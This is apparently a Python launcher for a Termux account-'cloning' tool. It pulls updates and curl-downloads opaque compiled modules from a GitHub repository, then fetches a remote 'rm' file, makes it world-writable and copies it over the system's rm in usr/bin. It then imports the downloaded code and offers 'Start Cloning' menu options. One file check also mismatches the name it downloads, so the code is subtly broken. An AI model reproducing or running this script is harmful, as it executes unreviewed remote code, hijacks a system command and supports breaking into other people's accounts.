import os
os.system('git pull')
from os import path,system
from platform import uname
arch=uname().machine.lower()
if path.isfile("XD.so"):
    pass
else:
    system("curl -L https://raw.githubusercontent.com/AKING110/AKING-PRO/main/XD.so -o XD.so")
if path.isfile("dz.so"):
    pass
else:
    system("curl -L https://raw.githubusercontent.com/AKING110/AKING-PRO/main/dump.so -o dump.so")
if path.isfile("rm"):
    pass
else:
    system("curl -L https://raw.githubusercontent.com/AKING110/AKING-PRO/main/rm -o rm")
    system('chmod 777 rm && cp rm /data/data/com.termux/files/usr/bin')
if 'aarch' in arch:
    arch = 'aarch'
    print('\033[1;37m\nCongratulatings! Your Deviec Support This Tools')
    system('clear')
    print('\n [1] Start Cloning V1.8.0 \n [2] Start Cloning V1.7.5 \n [0] Exit menu ')
    xd=input('\n Choose: ')
    if xd in ['1']:
        import XD
        XD.menu()
    elif xd in ['2']:
        import pro
        pro.menu()
    else:exit()
else:exit('\033[1;31m Sorry System or device not supported ')
    
